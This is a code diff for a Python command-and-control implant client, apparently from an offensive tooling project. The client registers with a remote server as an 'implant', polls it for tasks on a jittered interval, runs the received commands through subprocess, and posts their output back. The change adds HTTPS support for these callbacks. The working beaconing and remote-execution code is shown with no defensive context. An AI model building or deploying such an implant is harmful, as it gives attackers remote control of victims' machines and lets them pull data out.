@@ -7,12 +7,16 @@ import random
 
 class Client:
 
-    def __init__(self,server_ip, port=80,callback_interval=120,jitter=5,debug=False):
+    def __init__(self,server_ip, port=80,callback_interval=120,jitter=5,debug=False,https=False):
         self.server_ip = server_ip
         self.port = port
         self.callback_interval = callback_interval
         self.jitter = jitter
         self.debug = debug
+        if https:
+            self.protocol = "https://"
+        else:
+            self.protocol = "http://"
         if platform.system() == "Linux":
             self.local_ip = subprocess.run("hostname -I | awk '{print $1}'", shell=True, capture_output=True, text=True).stdout.strip()
         else:
@@ -22,7 +26,7 @@ class Client:
 
     def register(self):
         data = {'agent_id': self.local_ip,"os": self.os, "implant_type": self.implant_type}
-        req = requests.post(f"http://{self.server_ip}:{self.port}/register", json=data, timeout=10)
+        req = requests.post(f"{self.protocol}{self.server_ip}:{self.port}/register", json=data, timeout=10)
         if req.status_code not in [200, 201]:
             raise ValueError("Failed to register")
 
@@ -41,14 +45,14 @@ class Client:
                 data = {'agent_id':self.local_ip,'task_id': task_id, 'result': ps.stdout,'returncode': ps.returncode}
                 if self.debug:
                     print("Sending result back to server:",data)
-                req = requests.post(f"http://{self.server_ip}:{self.port}/results", json=data)
+                req = requests.post(f"{self.protocol}{self.server_ip}:{self.port}/results", json=data)
             elif task == "download":
                 pass
             else:
                 raise ValueError("Invalid task type")
         except subprocess.CalledProcessError as e:
                 data = {'agent_id':self.local_ip,'task_id': task_id, 'result': e.stderr,'returncode': e.returncode}
-                req = requests.post(f"http://{self.server_ip}:{self.port}/results", json=data)
+                req = requests.post(f"{self.protocol}{self.server_ip}:{self.port}/results", json=data)
         except Exception as e:
             pass
 
@@ -73,7 +77,7 @@ class Client:
                 self.sleep()
         while True:
             try:
-                req = requests.post(f"http://{self.server_ip}:{self.port}/tasks", json={'agent_id': self.local_ip}, timeout=10)
+                req = requests.post(f"{self.protocol}{self.server_ip}:{self.port}/tasks", json={'agent_id': self.local_ip}, timeout=10)
                 if req.status_code == 418:
                     self.register()
                     continue
